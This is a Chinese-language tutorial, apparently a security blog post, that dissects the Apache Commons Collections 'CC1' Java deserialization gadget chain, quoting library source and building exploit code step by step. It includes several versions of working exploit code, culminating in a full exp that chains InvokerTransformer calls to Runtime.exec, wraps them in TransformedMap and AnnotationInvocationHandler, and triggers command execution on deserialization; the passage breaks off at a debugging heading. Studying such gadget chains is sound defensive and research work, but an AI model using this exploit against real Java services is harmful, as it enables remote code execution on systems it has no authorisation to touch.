从 Transformer 接口入手根据前人挖洞的审核，我们从Transformer这个接口入口，我们发现这个这个接口很简单，输入一个内容然后执行方法
public interface Transformer &#123;        /**       * Transforms the input object (leaving it unchanged) into some output object.     *     * @param input  the object to be transformed, should be left unchanged       * @return a transformed object       * @throws ClassCastException (runtime) if the input is the wrong class       * @throws IllegalArgumentException (runtime) if the input is invalid       * @throws FunctorException (runtime) if the transform cannot be completed       */    public Object transform(Object input);    &#125;
我们查找这个接口的具体实现类，我们发现有很多，先看chain的类
/*   *  Licensed to the Apache Software Foundation (ASF) under one or more *  contributor license agreements.  See the NOTICE file distributed with *  this work for additional information regarding copyright ownership. *  The ASF licenses this file to You under the Apache License, Version 2.0 *  (the &quot;License&quot;); you may not use this file except in compliance with *  the License.  You may obtain a copy of the License at * *      http://www.apache.org/licenses/LICENSE-2.0 * *  Unless required by applicable law or agreed to in writing, software *  distributed under the License is distributed on an &quot;AS IS&quot; BASIS, *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. *  See the License for the specific language governing permissions and *  limitations under the License. */package org.apache.commons.collections.functors;    import java.io.Serializable;  import java.util.Collection;  import java.util.Iterator;    import org.apache.commons.collections.Transformer;    /**   * Transformer implementation that chains the specified transformers together. * &lt;p&gt;   * The input object is passed to the first transformer. The transformed result   * is passed to the second transformer and so on. ** @since Commons Collections 3.0   * @version $Revision: 646777 $ $Date: 2008-04-10 13:33:15 +0100 (Thu, 10 Apr 2008) $   * * @author Stephen Colebourne   */public class ChainedTransformer implements Transformer, Serializable &#123;        /** Serial version UID */      private static final long serialVersionUID = 3514945074733160196L;        /** The transformers to call in turn */      private final Transformer[] iTransformers;        /**       * Factory method that performs validation and copies the parameter array.     ** @param transformers  the transformers to chain, copied, no nulls       * @return the &lt;code&gt;chained&lt;/code&gt; transformer       * @throws IllegalArgumentException if the transformers array is null       * @throws IllegalArgumentException if any transformer in the array is null       */    public static Transformer getInstance(Transformer[] transformers) &#123;          FunctorUtils.validate(transformers);          if (transformers.length == 0) &#123;              return NOPTransformer.INSTANCE;          &#125;          transformers = FunctorUtils.copy(transformers);          return new ChainedTransformer(transformers);      &#125;            /**       * Create a new Transformer that calls each transformer in turn, passing the     * result into the next transformer. The ordering is that of the iterator()       * method on the collection.     ** @param transformers  a collection of transformers to chain       * @return the &lt;code&gt;chained&lt;/code&gt; transformer       * @throws IllegalArgumentException if the transformers collection is null       * @throws IllegalArgumentException if any transformer in the collection is null       */    public static Transformer getInstance(Collection transformers) &#123;          if (transformers == null) &#123;              throw new IllegalArgumentException(&quot;Transformer collection must not be null&quot;);          &#125;          if (transformers.size() == 0) &#123;              return NOPTransformer.INSTANCE;          &#125;          // convert to array like this to guarantee iterator() ordering          Transformer[] cmds = new Transformer[transformers.size()];          int i = 0;          for (Iterator it = transformers.iterator(); it.hasNext();) &#123;              cmds[i++] = (Transformer) it.next();          &#125;          FunctorUtils.validate(cmds);          return new ChainedTransformer(cmds);      &#125;        /**       * Factory method that performs validation.     ** @param transformer1  the first transformer, not null       * @param transformer2  the second transformer, not null       * @return the &lt;code&gt;chained&lt;/code&gt; transformer       * @throws IllegalArgumentException if either transformer is null       */    public static Transformer getInstance(Transformer transformer1, Transformer transformer2) &#123;          if (transformer1 == null || transformer2 == null) &#123;              throw new IllegalArgumentException(&quot;Transformers must not be null&quot;);          &#125;          Transformer[] transformers = new Transformer[] &#123; transformer1, transformer2 &#125;;          return new ChainedTransformer(transformers);      &#125;        /**       * Constructor that performs no validation.     * Use &lt;code&gt;getInstance&lt;/code&gt; if you want that.       ** @param transformers  the transformers to chain, not copied, no nulls       */    public ChainedTransformer(Transformer[] transformers) &#123;          super();          iTransformers = transformers;      &#125;        /**       * Transforms the input to result via each decorated transformer     ** @param object  the input object passed to the first transformer       * @return the transformed result       */    public Object transform(Object object) &#123;          for (int i = 0; i &lt; iTransformers.length; i++) &#123;              object = iTransformers[i].transform(object);          &#125;          return object;      &#125;        /**       * Gets the transformers, do not modify the array.     * @return the transformers       * @since Commons Collections 3.1       */    public Transformer[] getTransformers() &#123;          return iTransformers;      &#125;    &#125;

InvokerTransformer 与命令执行实现功能吧不同的transformer类连成一个链，前一个的结果是后一个的输入，但是我们没有找到可以直接执行危险命令的地方，接下来我们看invoke的类
我们首先是要发现一个能执行危险函数的地方，也就是能执行exec的地方，java里执行exec是Runtime类里面的一个方法。
/*   *  Licensed to the Apache Software Foundation (ASF) under one or more *  contributor license agreements.  See the NOTICE file distributed with *  this work for additional information regarding copyright ownership. *  The ASF licenses this file to You under the Apache License, Version 2.0 *  (the &quot;License&quot;); you may not use this file except in compliance with *  the License.  You may obtain a copy of the License at * *      http://www.apache.org/licenses/LICENSE-2.0 * *  Unless required by applicable law or agreed to in writing, software *  distributed under the License is distributed on an &quot;AS IS&quot; BASIS, *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. *  See the License for the specific language governing permissions and *  limitations under the License. */package org.apache.commons.collections.functors;    import java.io.Serializable;  import java.lang.reflect.InvocationTargetException;  import java.lang.reflect.Method;    import org.apache.commons.collections.FunctorException;  import org.apache.commons.collections.Transformer;    /**   * Transformer implementation that creates a new object instance by reflection. ** @since Commons Collections 3.0   * @version $Revision: 646777 $ $Date: 2008-04-10 13:33:15 +0100 (Thu, 10 Apr 2008) $   * * @author Stephen Colebourne   */public class InvokerTransformer implements Transformer, Serializable &#123;        /** The serial version */      private static final long serialVersionUID = -8653385846894047688L;            /** The method name to call */      private final String iMethodName;      /** The array of reflection parameter types */      private final Class[] iParamTypes;      /** The array of reflection arguments */      private final Object[] iArgs;        /**       * Gets an instance of this transformer calling a specific method with no arguments.     ** @param methodName  the method name to call       * @return an invoker transformer       * @since Commons Collections 3.1       */    public static Transformer getInstance(String methodName) &#123;          if (methodName == null) &#123;              throw new IllegalArgumentException(&quot;The method to invoke must not be null&quot;);          &#125;          return new InvokerTransformer(methodName);      &#125;        /**       * Gets an instance of this transformer calling a specific method with specific values.     ** @param methodName  the method name to call       * @param paramTypes  the parameter types of the method       * @param args  the arguments to pass to the method       * @return an invoker transformer       */    public static Transformer getInstance(String methodName, Class[] paramTypes, Object[] args) &#123;          if (methodName == null) &#123;              throw new IllegalArgumentException(&quot;The method to invoke must not be null&quot;);          &#125;          if (((paramTypes == null) &amp;&amp; (args != null))              || ((paramTypes != null) &amp;&amp; (args == null))              || ((paramTypes != null) &amp;&amp; (args != null) &amp;&amp; (paramTypes.length != args.length))) &#123;              throw new IllegalArgumentException(&quot;The parameter types must match the arguments&quot;);          &#125;          if (paramTypes == null || paramTypes.length == 0) &#123;              return new InvokerTransformer(methodName);          &#125; else &#123;              paramTypes = (Class[]) paramTypes.clone();              args = (Object[]) args.clone();              return new InvokerTransformer(methodName, paramTypes, args);          &#125;      &#125;        /**       * Constructor for no arg instance.     ** @param methodName  the method to call       */    private InvokerTransformer(String methodName) &#123;          super();          iMethodName = methodName;          iParamTypes = null;          iArgs = null;      &#125;        /**       * Constructor that performs no validation.     * Use &lt;code&gt;getInstance&lt;/code&gt; if you want that.       ** @param methodName  the method to call       * @param paramTypes  the constructor parameter types, not cloned       * @param args  the constructor arguments, not cloned       */    public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123;          super();          iMethodName = methodName;          iParamTypes = paramTypes;          iArgs = args;      &#125;        /**       * Transforms the input to result by invoking a method on the input.     ** @param input  the input object to transform       * @return the transformed result, null if null input       */    public Object transform(Object input) &#123;          if (input == null) &#123;              return null;          &#125;          try &#123;              Class cls = input.getClass();              Method method = cls.getMethod(iMethodName, iParamTypes);              return method.invoke(input, iArgs);                            &#125; catch (NoSuchMethodException ex) &#123;              throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; does not exist&quot;);          &#125; catch (IllegalAccessException ex) &#123;              throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; cannot be accessed&quot;);          &#125; catch (InvocationTargetException ex) &#123;              throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; threw an exception&quot;, ex);          &#125;      &#125;    &#125;
我们观察一下这个invoketransformer他有两个构造方法，一个是传入方法名进行构造，这是是私有的，另一个是传入方法名，参数类型以及参数值进行构造，这个方法是公有的。还有根据参数的不同形成的几个工厂方法然后我们看他这里是怎么实现这个transformer方法的。这个方法要有一个输入，根据这个输入确定Class，然后通过反射去执行这个命令
public Object transform(Object input) &#123;      if (input == null) &#123;          return null;      &#125;      try &#123;          Class cls = input.getClass();          Method method = cls.getMethod(iMethodName, iParamTypes);          return method.invoke(input, iArgs);
到这一步我们就发现了我们貌似可以通过这个方法实现任意命令的一个执行，我们先写一个简单的测试一下。
public class CC1Step1 &#123;      public static void main(String[] args) throws Exception &#123;          Runtime runtime = Runtime.getRuntime();          InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;);          invokerTransformer.transform(runtime);        &#125;  &#125;

我们创建一个Runtime，然后实例化一个InvokeTransformer，调用他的transformer方法这样就实现了我们执行任意命令的目的，这也就是利用链的链尾部分。
寻找 Transformer 的调用位置我们为了形成一个完整的攻击链，从攻击者的角度考虑，服务端只给我们提供了一个反序列化的入口，所以我们上传的是一个序列化的数据，一般来说能序列化的就是对象和集合，所以很明显我们要找谁调用了transformer这个方法。
然后我们发现在TransformerMap这个类里面有三个方法都调用了这个方法。
/*   *  Licensed to the Apache Software Foundation (ASF) under one or more *  contributor license agreements.  See the NOTICE file distributed with *  this work for additional information regarding copyright ownership. *  The ASF licenses this file to You under the Apache License, Version 2.0 *  (the &quot;License&quot;); you may not use this file except in compliance with *  the License.  You may obtain a copy of the License at * *      http://www.apache.org/licenses/LICENSE-2.0 * *  Unless required by applicable law or agreed to in writing, software *  distributed under the License is distributed on an &quot;AS IS&quot; BASIS, *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. *  See the License for the specific language governing permissions and *  limitations under the License. */package org.apache.commons.collections.map;    import java.io.IOException;  import java.io.ObjectInputStream;  import java.io.ObjectOutputStream;  import java.io.Serializable;  import java.util.Iterator;  import java.util.Map;    import org.apache.commons.collections.Transformer;    /**   * Decorates another &lt;code&gt;Map&lt;/code&gt; to transform objects that are added.   * &lt;p&gt;   * The Map put methods and Map.Entry setValue method are affected by this class.   * Thus objects must be removed or searched for using their transformed form. * For example, if the transformation converts Strings to Integers, you must * use the Integer form to remove objects. * &lt;p&gt;   * &lt;strong&gt;Note that TransformedMap is not synchronized and is not thread-safe.&lt;/strong&gt;   * If you wish to use this map from multiple threads concurrently, you must use   * appropriate synchronization. The simplest approach is to wrap this map * using &#123;@link java.util.Collections#synchronizedMap(Map)&#125;. This class may throw    * exceptions when accessed by concurrent threads without synchronization.   * &lt;p&gt;   * This class is Serializable from Commons Collections 3.1.   * * @since Commons Collections 3.0   * @version $Revision: 646777 $ $Date: 2008-04-10 13:33:15 +0100 (Thu, 10 Apr 2008) $   ** @author Stephen Colebourne   */public class TransformedMap          extends AbstractInputCheckedMapDecorator          implements Serializable &#123;        /** Serialization version */      private static final long serialVersionUID = 7023152376788900464L;        /** The transformer to use for the key */      protected final Transformer keyTransformer;      /** The transformer to use for the value */      protected final Transformer valueTransformer;        /**       * Factory method to create a transforming map.     * &lt;p&gt;       * If there are any elements already in the map being decorated, they       * are NOT transformed.     * Constrast this with &#123;@link #decorateTransform&#125;.       ** @param map  the map to decorate, must not be null       * @param keyTransformer  the transformer to use for key conversion, null means no transformation       * @param valueTransformer  the transformer to use for value conversion, null means no transformation       * @throws IllegalArgumentException if map is null       */    public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123;          return new TransformedMap(map, keyTransformer, valueTransformer);      &#125;        /**       * Factory method to create a transforming map that will transform     * existing contents of the specified map.     * &lt;p&gt;       * If there are any elements already in the map being decorated, they       * will be transformed by this method.     * Constrast this with &#123;@link #decorate&#125;.       ** @param map  the map to decorate, must not be null       * @param keyTransformer  the transformer to use for key conversion, null means no transformation       * @param valueTransformer  the transformer to use for value conversion, null means no transformation       * @throws IllegalArgumentException if map is null       * @since Commons Collections 3.2       */    public static Map decorateTransform(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123;          TransformedMap decorated = new TransformedMap(map, keyTransformer, valueTransformer);          if (map.size() &gt; 0) &#123;              Map transformed = decorated.transformMap(map);              decorated.clear();              decorated.getMap().putAll(transformed);  // avoids double transformation          &#125;          return decorated;      &#125;        //-----------------------------------------------------------------------      /**       * Constructor that wraps (not copies).     * &lt;p&gt;       * If there are any elements already in the collection being decorated, they       * are NOT transformed.     ** @param map  the map to decorate, must not be null       * @param keyTransformer  the transformer to use for key conversion, null means no conversion       * @param valueTransformer  the transformer to use for value conversion, null means no conversion       * @throws IllegalArgumentException if map is null       */    protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123;          super(map);          this.keyTransformer = keyTransformer;          this.valueTransformer = valueTransformer;      &#125;        //-----------------------------------------------------------------------      /**       * Write the map out using a custom routine.     ** @param out  the output stream       * @throws IOException       * @since Commons Collections 3.1       */    private void writeObject(ObjectOutputStream out) throws IOException &#123;          out.defaultWriteObject();          out.writeObject(map);      &#125;        /**       * Read the map in using a custom routine.     ** @param in  the input stream       * @throws IOException       * @throws ClassNotFoundException       * @since Commons Collections 3.1       */    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException &#123;          in.defaultReadObject();          map = (Map) in.readObject();      &#125;        //-----------------------------------------------------------------------      /**       * Transforms a key.     * &lt;p&gt;       * The transformer itself may throw an exception if necessary.       ** @param object  the object to transform       * @throws the transformed object       */    protected Object transformKey(Object object) &#123;          if (keyTransformer == null) &#123;              return object;          &#125;          return keyTransformer.transform(object);      &#125;        /**       * Transforms a value.     * &lt;p&gt;       * The transformer itself may throw an exception if necessary.       ** @param object  the object to transform       * @throws the transformed object       */    protected Object transformValue(Object object) &#123;          if (valueTransformer == null) &#123;              return object;          &#125;          return valueTransformer.transform(object);      &#125;        /**       * Transforms a map.     * &lt;p&gt;       * The transformer itself may throw an exception if necessary.       ** @param map  the map to transform       * @throws the transformed object       */    protected Map transformMap(Map map) &#123;          if (map.isEmpty()) &#123;              return map;          &#125;          Map result = new LinkedMap(map.size());          for (Iterator it = map.entrySet().iterator(); it.hasNext(); ) &#123;              Map.Entry entry = (Map.Entry) it.next();              result.put(transformKey(entry.getKey()), transformValue(entry.getValue()));          &#125;          return result;      &#125;        /**       * Override to transform the value when using &lt;code&gt;setValue&lt;/code&gt;.       ** @param value  the value to transform       * @return the transformed value       * @since Commons Collections 3.1       */    protected Object checkSetValue(Object value) &#123;          return valueTransformer.transform(value);      &#125;        /**       * Override to only return true when there is a value transformer.     ** @return true if a value transformer is in use       * @since Commons Collections 3.1       */    protected boolean isSetValueChecking() &#123;          return (valueTransformer != null);      &#125;        //-----------------------------------------------------------------------      public Object put(Object key, Object value) &#123;          key = transformKey(key);          value = transformValue(value);          return getMap().put(key, value);      &#125;        public void putAll(Map mapToCopy) &#123;          mapToCopy = transformMap(mapToCopy);          getMap().putAll(mapToCopy);      &#125;    &#125;

我们稍微理解一下这段代码，这个类继承自AbstractInputCheckedMapDecorator，是可以被序列化的，这个类接收两个参数这两个参数都是Transformer我们发现这个类的构造方法是protected的，但是提供了一个静态方法用来实例化对象我们发现这个类里面的checkSetValue方法调用了Transformer这个方法，我们只要让这个value是Runtime就可以了，我们写个简单的exp试一试。
public class CC1Step1 &#123;      public static void main(String[] args) throws Exception &#123;          Runtime runtime = Runtime.getRuntime();          InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;);  //        invokerTransformer.transform(runtime);          HashMap&lt;Object, Object&gt; objectObjectHashMap = new HashMap&lt;&gt;();          Map decorate = TransformedMap.decorate(objectObjectHashMap, null, invokerTransformer);          Class&lt;? extends Map&gt; aClass = decorate.getClass();          Method checkSetValue = aClass.getDeclaredMethod(&quot;checkSetValue&quot;,Object.class);          checkSetValue.setAccessible(true);          checkSetValue.invoke(decorate,runtime);              &#125;  &#125;
这段代码我绕了好久才明白，我们的目的是使用这个transformer，并且使用这个transformer的是一个invoke的transformer，这样的话才能自然而然的调用他那个类里重写的方法，我们找到的这段函数是valuetransformer去调用，那么我们就要让valuetransformer是invoketransformer，所以我们把这个对象的第三个参数设置成这个，value的参数自然是Runtime，这样就可以实现我们的命令了。这一步我们总结出来的道理就是我们要找到谁使用了这个transformer方法，我们要保证使用这个方法的可以是invoketransformer，好像有点像废话，肯定只有transformer的参数才能用这个方法啊。我们接着往下找吧。
我们只能创建对象或者集合，所以我们就要找谁使用了这个decorate这个方法，遗憾的是这条路是走不通的，这种情况意味着我们不能实例化这个对象了，因为decorate我们不能使用，所以我们就只能找还有哪个类调用了checkvalue这个方法。
AbstractInputCheckedMapDecorator 与 setValue我们发现只有一个调用了这个方法，就是AbstractInputCheckedMapDecorator类
/*   *  Licensed to the Apache Software Foundation (ASF) under one or more *  contributor license agreements.  See the NOTICE file distributed with *  this work for additional information regarding copyright ownership. *  The ASF licenses this file to You under the Apache License, Version 2.0 *  (the &quot;License&quot;); you may not use this file except in compliance with *  the License.  You may obtain a copy of the License at * *      http://www.apache.org/licenses/LICENSE-2.0 * *  Unless required by applicable law or agreed to in writing, software *  distributed under the License is distributed on an &quot;AS IS&quot; BASIS, *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. *  See the License for the specific language governing permissions and *  limitations under the License. */package org.apache.commons.collections.map;    import java.lang.reflect.Array;  import java.util.Iterator;  import java.util.Map;  import java.util.Set;    import org.apache.commons.collections.iterators.AbstractIteratorDecorator;  import org.apache.commons.collections.keyvalue.AbstractMapEntryDecorator;  import org.apache.commons.collections.set.AbstractSetDecorator;    /**   * An abstract base class that simplifies the task of creating map decorators. * &lt;p&gt;   * The Map API is very difficult to decorate correctly, and involves implementing   * lots of different classes. This class exists to provide a simpler API. * &lt;p&gt;   * Special hook methods are provided that are called when objects are added to   * the map. By overriding these methods, the input can be validated or manipulated. * In addition to the main map methods, the entrySet is also affected, which is * the hardest part of writing map implementations. * &lt;p&gt;   * This class is package-scoped, and may be withdrawn or replaced in future   * versions of Commons Collections. * * @since Commons Collections 3.1   * @version $Revision: 646777 $ $Date: 2008-04-10 13:33:15 +0100 (Thu, 10 Apr 2008) $   ** @author Stephen Colebourne   */abstract class AbstractInputCheckedMapDecorator          extends AbstractMapDecorator &#123;        /**       * Constructor only used in deserialization, do not use otherwise.     */    protected AbstractInputCheckedMapDecorator() &#123;          super();      &#125;        /**       * Constructor that wraps (not copies).     ** @param map  the map to decorate, must not be null       * @throws IllegalArgumentException if map is null       */    protected AbstractInputCheckedMapDecorator(Map map) &#123;          super(map);      &#125;        //-----------------------------------------------------------------------      /**       * Hook method called when a value is being set using &lt;code&gt;setValue&lt;/code&gt;.       * &lt;p&gt;       * An implementation may validate the value and throw an exception       * or it may transform the value into another object.     * &lt;p&gt;       * This implementation returns the input value.       ** @param value  the value to check       * @throws UnsupportedOperationException if the map may not be changed by setValue       * @throws IllegalArgumentException if the specified value is invalid       * @throws ClassCastException if the class of the specified value is invalid       * @throws NullPointerException if the specified value is null and nulls are invalid       */    protected abstract Object checkSetValue(Object value);        /**       * Hook method called to determine if &lt;code&gt;checkSetValue&lt;/code&gt; has any effect.       * &lt;p&gt;       * An implementation should return false if the &lt;code&gt;checkSetValue&lt;/code&gt; method       * has no effect as this optimises the implementation.     * &lt;p&gt;       * This implementation returns &lt;code&gt;true&lt;/code&gt;.       ** @return true always       */    protected boolean isSetValueChecking() &#123;          return true;      &#125;        //-----------------------------------------------------------------------      public Set entrySet() &#123;          if (isSetValueChecking()) &#123;              return new EntrySet(map.entrySet(), this);          &#125; else &#123;              return map.entrySet();          &#125;      &#125;        //-----------------------------------------------------------------------      /**       * Implementation of an entry set that checks additions via setValue.     */    static class EntrySet extends AbstractSetDecorator &#123;                    /** The parent map */          private final AbstractInputCheckedMapDecorator parent;            protected EntrySet(Set set, AbstractInputCheckedMapDecorator parent) &#123;              super(set);              this.parent = parent;          &#125;            public Iterator iterator() &#123;              return new EntrySetIterator(collection.iterator(), parent);          &#125;                    public Object[] toArray() &#123;              Object[] array = collection.toArray();              for (int i = 0; i &lt; array.length; i++) &#123;                  array[i] = new MapEntry((Map.Entry) array[i], parent);              &#125;              return array;          &#125;                    public Object[] toArray(Object array[]) &#123;              Object[] result = array;              if (array.length &gt; 0) &#123;                  // we must create a new array to handle multi-threaded situations                  // where another thread could access data before we decorate it                result = (Object[]) Array.newInstance(array.getClass().getComponentType(), 0);              &#125;              result = collection.toArray(result);              for (int i = 0; i &lt; result.length; i++) &#123;                  result[i] = new MapEntry((Map.Entry) result[i], parent);              &#125;                // check to see if result should be returned straight              if (result.length &gt; array.length) &#123;                  return result;              &#125;                // copy back into input array to fulfil the method contract              System.arraycopy(result, 0, array, 0, result.length);              if (array.length &gt; result.length) &#123;                  array[result.length] = null;              &#125;              return array;          &#125;      &#125;        /**       * Implementation of an entry set iterator that checks additions via setValue.     */    static class EntrySetIterator extends AbstractIteratorDecorator &#123;                    /** The parent map */          private final AbstractInputCheckedMapDecorator parent;                    protected EntrySetIterator(Iterator iterator, AbstractInputCheckedMapDecorator parent) &#123;              super(iterator);              this.parent = parent;          &#125;                    public Object next() &#123;              Map.Entry entry = (Map.Entry) iterator.next();              return new MapEntry(entry, parent);          &#125;      &#125;        /**       * Implementation of a map entry that checks additions via setValue.     */    static class MapEntry extends AbstractMapEntryDecorator &#123;            /** The parent map */          private final AbstractInputCheckedMapDecorator parent;            protected MapEntry(Map.Entry entry, AbstractInputCheckedMapDecorator parent) &#123;              super(entry);              this.parent = parent;          &#125;            public Object setValue(Object value) &#123;              value = parent.checkSetValue(value);              return entry.setValue(value);          &#125;      &#125;    &#125;
这段代码很长，我们看到这是一个抽象类是不能实例化的，同时还没有public是不能直接访问的。很显然是他的子类在调用setvalue的时候会调用checksetvalue这个方法，所以接下来我们验证一下执行这个setvalue会不会触发调用。
protected MapEntry(Map.Entry entry, AbstractInputCheckedMapDecorator parent) &#123;      super(entry);      this.parent = parent;  &#125;    public Object setValue(Object value) &#123;      value = parent.checkSetValue(value);      return entry.setValue(value);  &#125;
我们不难发现，这里需要的对象是Map.Entry，我们新建的map是不能直接调用这个方法的，所以我们需要先进行一个遍历取出这个entry之后再能进行调用
public class CC1Step1 &#123;      public static void main(String[] args) throws Exception &#123;          Runtime runtime = Runtime.getRuntime();          InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;);  //        invokerTransformer.transform(runtime);          HashMap&lt;Object, Object&gt; objectObjectHashMap = new HashMap&lt;&gt;();          objectObjectHashMap.put(&quot;name&quot;,&quot;hello&quot;);          Map&lt;Object,Object&gt; decorate = TransformedMap.decorate(objectObjectHashMap, null, invokerTransformer);  //        Class&lt;? extends Map&gt; aClass = decorate.getClass();  //        Method checkSetValue = aClass.getDeclaredMethod(&quot;checkSetValue&quot;,Object.class);  //        checkSetValue.setAccessible(true);  //        checkSetValue.invoke(decorate,runtime);          for (Map.Entry entry : decorate.entrySet())&#123;              entry.setValue(runtime);            &#125;      &#125;  &#125;

进入 AnnotationInvocationHandler我们发现成功弹计算器，证明是可以正常调用的，接下来我们的目标就是谁调用了这个setvalue我们发现AnnotationInvocationHandler这个类的readobject调用了这个，那我们只要实例化这个类的对象然后再进行反序列化就完成目标了，终于要走到尽头了吗。接下来我们先把完整的exp写出来然后再进行修正。 AnnotationInvocationHandler这个类的代码非常长我就不贴出来了这个类继承自InvocationHandler，可以被序列化，有两个参数一个是type也就是注解，另一个就是map。
这个类是deafult的，也只能通过反射进行获取我们先本写exp吧
public class CC1Step1 &#123;      public static void main(String[] args) throws Exception &#123;          Runtime runtime = Runtime.getRuntime();          InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;);  //        invokerTransformer.transform(runtime);          HashMap&lt;Object, Object&gt; objectObjectHashMap = new HashMap&lt;&gt;();          objectObjectHashMap.put(&quot;name&quot;,&quot;hello&quot;);          Map&lt;Object,Object&gt; decorate = TransformedMap.decorate(objectObjectHashMap, null, invokerTransformer);  //        Class&lt;? extends Map&gt; aClass = decorate.getClass();  //        Method checkSetValue = aClass.getDeclaredMethod(&quot;checkSetValue&quot;,Object.class);  //        checkSetValue.setAccessible(true);  //        checkSetValue.invoke(decorate,runtime);          Class&lt;?&gt; bClass = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);          Constructor&lt;?&gt; declaredConstructor = bClass.getDeclaredConstructor(Class.class, Map.class);          declaredConstructor.setAccessible(true);          Object o = declaredConstructor.newInstance(Override.class, objectObjectHashMap);        &#125;  &#125;

通过反射组织调用链接下来我们要解决一个问题，Runtime是不能序列化的。我们可以先使用反射的方式实现命令执行
Class&lt;Runtime&gt; runtimeClass = Runtime.class;  Method getRuntime = runtimeClass.getMethod(&quot;getRuntime&quot;);  Object invoke = getRuntime.invoke(null, null);  Method exec = runtimeClass.getMethod(&quot;exec&quot;, String.class);  exec.invoke(invoke,&quot;calc&quot;);
然后我们改成使用invoketransformer来实现
Object o1 = new InvokerTransformer(          &quot;getMethod&quot;,          new Class[]&#123;String.class, Class[].class&#125;,          new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;  ).transform(Runtime.class);//(Runtime.class).getMethod(&quot;getRuntime&quot;) --&gt; method    Object invoke1 = new InvokerTransformer(          &quot;invoke&quot;,          new Class[]&#123;Object.class, Object[].class&#125;,          new Object[]&#123;null, new Object[0]&#125;  ).transform(o1);//o1.invoke(null,null)  --&gt; 相当于创建一个runtime实例  Object getMethod = new InvokerTransformer(          &quot;getMethod&quot;,          new Class[]&#123;String.class, Class[].class&#125;,          new Object[]&#123;&quot;exec&quot;, String.class&#125;  ).transform(invoke1);//invoke1.getmethod(&quot;exec&quot;,String.class) --&gt;获取到exec这个方法  new InvokerTransformer(          &quot;invoke&quot;,          new Class[]&#123;Object.class, Object[].class&#125;,          new Object[]&#123;invoke1, &quot;calc&quot;&#125;  ).transform(getMethod);//exec.invoke(invoke1,&quot;calc&quot;)
这里逻辑还是挺绕的我们要理解o.transformer(input)–&gt;input.methodname(newobject[])
换成用chaintransformer表述
Transformer[] transformers = new Transformer[]&#123;                // 起点：无视输入，固定返回 Runtime.class                new ConstantTransformer(Runtime.class),                // 第1步：Runtime.class.getMethod(&quot;getRuntime&quot;) → Method                new InvokerTransformer(                        &quot;getMethod&quot;,                        new Class[]&#123;String.class, Class[].class&#125;,                        new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;                ),                // 第2步：Method.invoke(null) → Runtime 实例                new InvokerTransformer(                        &quot;invoke&quot;,                        new Class[]&#123;Object.class, Object[].class&#125;,                        new Object[]&#123;null, new Object[0]&#125;                ),                // 第3步：Runtime 实例.exec(&quot;calc&quot;) → 直接执行，不再找 exec                new InvokerTransformer(                        &quot;exec&quot;,                        new Class[]&#123;String.class&#125;,                        new Object[]&#123;&quot;calc&quot;&#125;                )        &#125;;        Transformer chain = new ChainedTransformer(transformers);        // 触发：输入任意值（会被 ConstantTransformer 丢弃）        chain.transform(&quot;随便什么&quot;);

构造完整实验代码最终得到一个完整的exp
  import org.apache.commons.collections.Transformer;  import org.apache.commons.collections.functors.InvokerTransformer;  import org.apache.commons.collections.functors.ChainedTransformer;  import org.apache.commons.collections.map.TransformedMap;    import java.io.*;  import java.lang.reflect.Constructor;  import java.util.HashMap;  import java.util.Map;    // 解决了第一个问题  public class CC1Step1 &#123;      public static void main(String[] args) throws Exception &#123;          Transformer[] transformers = new Transformer[]&#123;                  new InvokerTransformer(&quot;getMethod&quot;                          , new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;),                  new InvokerTransformer(&quot;invoke&quot;                          , new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;),                  new InvokerTransformer(&quot;exec&quot;                          , new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)          &#125;;          ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);          HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();          hashMap.put(&quot;key&quot;,&quot;value&quot;);          Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, null, chainedTransformer);          Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);          Constructor aihConstructor = c.getDeclaredConstructor(Class.class, Map.class);          aihConstructor.setAccessible(true);          Object o = aihConstructor.newInstance(Override.class, transformedMap);            // 序列化反序列化          serialize(o);          unserialize(&quot;ser.bin&quot;);      &#125;      public static void serialize(Object obj) throws IOException &#123;          ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));          oos.writeObject(obj);      &#125;      public static Object unserialize(String Filename) throws IOException, ClassNotFoundException&#123;          ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));          Object obj = ois.readObject();          return obj;      &#125;  &#125;

断点调试与条件修正紧接着我们下断点进行调试
